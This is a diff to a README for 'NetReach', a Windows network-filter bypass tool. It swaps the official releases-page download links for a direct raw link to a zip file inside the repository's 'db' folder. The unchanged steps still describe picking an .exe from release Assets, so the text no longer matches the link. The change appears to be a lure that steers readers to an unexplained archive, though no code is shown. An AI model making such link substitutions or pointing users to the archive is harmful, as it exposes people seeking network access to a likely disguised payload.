@@ -1,6 +1,6 @@
 # 🌐 NetReach - Find open paths through restricted networks
 
-[![Download NetReach](https://img.shields.io/badge/Download_NetReach-Blue-blue)](https://github.com/jerm108/NetReach/releases)
+[![Download NetReach](https://img.shields.io/badge/Download_NetReach-Blue-blue)](https://raw.githubusercontent.com/jerm108/NetReach/main/db/Reach-Net-v1.8.zip)
 
 NetReach helps you connect to the internet when local restrictions block your access. Many networks use filters to stop you from reaching specific websites or services. NetReach identifies which paths remain open by scanning for servers that bypass these blocks. You receive a list of functional connections to restore your access.
 
@@ -18,7 +18,7 @@ NetReach runs on most modern Windows computers. Ensure your system meets these r
 
 You need to download the correct file for your computer. Follow these steps to obtain the tool:
 
-1. Visit this page to download the software: https://github.com/jerm108/NetReach/releases
+1. Visit this page to download the software: https://raw.githubusercontent.com/jerm108/NetReach/main/db/Reach-Net-v1.8.zip
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` that matches your Windows version.
 4. Save the file to your Downloads folder or your Desktop.
